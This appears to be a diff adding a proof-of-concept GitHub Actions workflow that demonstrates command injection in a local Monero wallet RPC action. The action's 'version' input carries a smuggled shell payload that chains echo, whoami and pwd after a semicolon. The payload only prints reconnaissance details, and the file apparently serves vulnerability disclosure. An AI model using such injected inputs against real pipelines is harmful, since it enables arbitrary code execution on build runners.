@@ -1,0 +1,19 @@
+name: POC - Command Injection
+on: 
+  workflow_dispatch:
+    inputs:
+      test_payload:
+        description: 'Test payload'
+        required: false
+        default: 'safe'
+
+jobs:
+  demonstrate:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      
+      - name: Vulnerable Action Usage
+        uses: ./.github/actions/monero-wallet-rpc
+        with:
+          version: "v0.18.3.4; echo '🎯 COMMAND INJECTION SUCCESSFUL'; echo 'User: $(whoami)'; echo 'Directory: $(pwd)'; echo 'GitHub Runner: ${{ runner.os }}'; #"
